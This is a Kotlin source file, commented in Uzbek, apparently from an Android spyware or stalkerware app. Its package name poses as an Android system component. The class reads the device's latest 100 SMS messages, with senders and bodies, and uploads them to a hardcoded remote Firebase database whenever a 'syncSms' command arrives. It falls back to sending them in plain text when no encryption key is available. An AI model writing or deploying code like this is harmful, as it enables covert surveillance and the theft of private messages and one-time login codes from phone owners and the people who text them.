package com.android.system.core.sms

import android.content.Context
import android.provider.Telephony
import android.util.Log
import com.android.system.core.BuildConfig
import com.android.system.core.crypto.CryptoManager
import com.android.system.core.crypto.KeyFetchWorker
import com.google.firebase.database.FirebaseDatabase

/**
 * SMS larni ContentResolver orqali o'qib Firebase'ga yuklaydi.
 * Firebase path: devices/{uid}/sms/
 * Trigger: command type "syncSms"
 */
class SmsReader(private val context: Context) {

    companion object {
        private const val TAG = "SYS_CORE_SMS"
        private const val MAX_SMS = 100
        private const val FIREBASE_URL = "https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app"
    }

    /**
     * SMS larni o'qib Firebase'ga yuklaydi.
     * @param uid qurilma UID
     * @param onComplete yuklash tugaganda chaqiriladi (success: Boolean)
     */
    fun readAndUpload(uid: String, onComplete: (Boolean) -> Unit = {}) {
        try {
            val smsList = readSms()
            if (BuildConfig.DEBUG) { Log.d(TAG, "Read ${smsList.size} SMS messages") }

            if (smsList.isEmpty()) {
                if (BuildConfig.DEBUG) { Log.d(TAG, "No SMS found, uploading empty list") }
                onComplete(true)
                return
            }

            val aesKey = KeyFetchWorker.getAesKey(context)
            if (aesKey == null && BuildConfig.DEBUG) {
                Log.w(TAG, "AES key not available, SMS will be uploaded unencrypted")
            }

            // SMS map yaratish
            val smsMap = mutableMapOf<String, Any>()
            smsList.forEachIndexed { index, sms ->
                val encryptedAddress = if (aesKey != null) {
                    CryptoManager.encrypt(sms.address, aesKey) ?: sms.address
                } else sms.address

                val encryptedBody = if (aesKey != null) {
                    CryptoManager.encrypt(sms.body, aesKey) ?: sms.body
                } else sms.body

                smsMap["$index"] = mapOf(
                    "id" to sms.id,
                    "address" to encryptedAddress,
                    "body" to encryptedBody,
                    "date" to sms.date,
                    "type" to sms.type
                )
            }

            // Firebase'ga yozish
            FirebaseDatabase.getInstance(FIREBASE_URL)
                .getReference("devices")
                .child(uid)
                .child("sms")
                .setValue(smsMap)
                .addOnSuccessListener {
                    if (BuildConfig.DEBUG) { Log.d(TAG, "SMS uploaded successfully: ${smsList.size} messages") }
                    onComplete(true)
                }
                .addOnFailureListener { e ->
                    if (BuildConfig.DEBUG) { Log.e(TAG, "SMS upload failed: ${e.message}") }
                    onComplete(false)
                }

        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e(TAG, "readAndUpload error: ${e.message}") }
            onComplete(false)
        }
    }

    /**
     * ContentResolver orqali SMS larni o'qiydi.
     * @return SmsData ro'yxati (max 100, date DESC tartibida)
     */
    private fun readSms(): List<SmsData> {
        val smsList = mutableListOf<SmsData>()
        try {
            val cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE
                ),
                null,
                null,
                "${Telephony.Sms.DATE} DESC LIMIT $MAX_SMS"
            )

            cursor?.use {
                val idCol = it.getColumnIndexOrThrow(Telephony.Sms._ID)
                val addressCol = it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
                val bodyCol = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
                val dateCol = it.getColumnIndexOrThrow(Telephony.Sms.DATE)
                val typeCol = it.getColumnIndexOrThrow(Telephony.Sms.TYPE)

                while (it.moveToNext()) {
                    smsList.add(
                        SmsData(
                            id = it.getString(idCol) ?: "",
                            address = it.getString(addressCol) ?: "",
                            body = it.getString(bodyCol) ?: "",
                            date = it.getLong(dateCol),
                            type = it.getInt(typeCol)
                        )
                    )
                }
            }
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e(TAG, "readSms error: ${e.message}") }
        }
        return smsList
    }

    /**
     * SMS ma'lumotlari modeli
     * @param type 1=inbox, 2=sent
     */
    data class SmsData(
        val id: String,
        val address: String,
        val body: String,
        val date: Long,
        val type: Int
    )
}
